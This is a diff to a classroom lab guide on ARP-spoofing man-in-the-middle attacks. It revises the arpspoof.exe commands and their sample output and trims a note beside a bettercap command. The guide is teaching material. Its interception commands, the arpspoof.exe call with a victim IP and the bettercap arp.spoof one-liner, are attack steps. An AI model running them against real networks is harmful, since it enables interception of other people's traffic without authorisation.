@@ -15,7 +15,7 @@ For this lab, we will be exploring what information an adversary can extract fro
 
 
 
-You will also need to know your victim's IP address as well as the IP address of the person hosting the site. Normally, this can be done using other tools such as netcat, however for the sake of ease and time, we can just tell each other our IP addresses. Follow the instructions below to perform our man-in-the-middle attack!
+You will also need to know your victim's IP address. Normally, this can be done using other tools such as netcat, however for the sake of ease and time, we can just look at our secondary device to find out it's IP address. Follow the instructions below to perform our man-in-the-middle attack!
 
 ### Windows ARP Spoofing:
 
@@ -25,17 +25,17 @@ Once you have `arpspoof.exe` downloaded, we can start using it immediately
     - `cd \path\to\tool\`
 
 2. Once in the appropriate directory, we will run the tool directly from the command line. We must also enter the victim's IP address, and the target IP address.
-    - `.\arpspoof.exe <victim IP> <target IP>`
+    - `.\arpspoof.exe <victim IP>`
 
-3. Let's say that my victim's IP address was `192.168.0.101`, and the web app they are connecting to is being hosted on `192.168.0.100` I would enter the following command:
-    - `.\arpspoof.exe 192.168.0.101 192.168.0.100`
+3. Let's say that my victim's IP address was `192.168.0.101`, I would enter the following command:
+    - `.\arpspoof.exe 192.168.0.101`
 
     And I should get the following output:
 
     ```
-    PS C:\Users\zacko\Downloads> .\arpspoof.exe 192.168.0.101 192.168.0.100
+    PS C:\Users\zacko\Downloads> .\arpspoof.exe 192.168.0.101
     Resolving victim and target...
-    Redirecting 192.168.0.101 (02:1A:4F:8E:7B:9C) ---> 192.168.0.100 (AC:D1:23:45:67:89)
+    Redirecting 192.168.0.101 (02:1A:4F:8E:7B:9C) ---> 192.168.0.1 (AC:D1:23:45:67:89)
             and in the other direction
     Press Ctrl+C to stop
     ```
@@ -56,8 +56,6 @@ Homebrew is a package manager for macOS, and allows us to install packages and s
 
 4. Enter the following command to perform your ARP spoof against your victim!
     `sudo bettercap -eval "set arp.spoof.targets <victim IP>; arp.spoof on"`
-    
-    Note that unlike on Windows, we do not need to also set the IP address for the person running the web application.
 
 5. Once you have finished the lab and want to end the ARP spoof, you can enter `Ctrl+C` to stop the program from running.
 
